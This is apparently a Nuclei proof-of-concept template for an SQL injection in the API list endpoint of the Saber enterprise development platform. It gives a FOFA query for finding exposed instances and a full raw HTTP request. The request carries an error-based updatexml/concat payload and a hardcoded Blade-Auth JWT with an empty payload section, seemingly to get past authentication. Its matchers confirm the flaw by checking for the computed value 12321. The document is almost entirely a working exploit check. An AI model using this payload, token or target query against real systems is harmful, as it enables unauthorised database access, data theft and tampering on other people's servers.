id: saber-platform-sqli-api-list

info:
  name: "Saber企业级开发平台 API列表接口SQL注入"
  author: 0dayPoc
  severity: high
  description: |-
    fofa: app="Saber企业级开发平台" || body="/saber/"
        Saber企业级开发平台的API列表接口存在可被利用的SQL注入缺陷。攻击者可通过构造恶意SQL请求利用该漏洞执行未经授权的数据库操作，可能导致敏感数据泄露、数据篡改或系统完整性受损。
  tags: Saber企业级开发平台

http:
- raw:
  - |
    GET /api/blade-log/api/list?updatexml(1,concat(0x7e,111*111,0x7e),1)=1 HTTP/1.1
    Host: {{Hostname}}
    Blade-Auth: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9..wxB9etQp2DUL5d3-VkChwDCV3Kp-qxjvhIF_aD_beF_KLwUHV7ROuQeroayRCPWgOcmjsOVq6FWdvvyhlz9j7A
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
    Accept-Encoding: gzip, deflate, br
    Accept-Language: zh-CN,zh;q=0.9
    Connection: close
  matchers-condition: and
  matchers:
  - type: status
    status: [500]
  - type: word
    part: body
    words:
    - '12321'
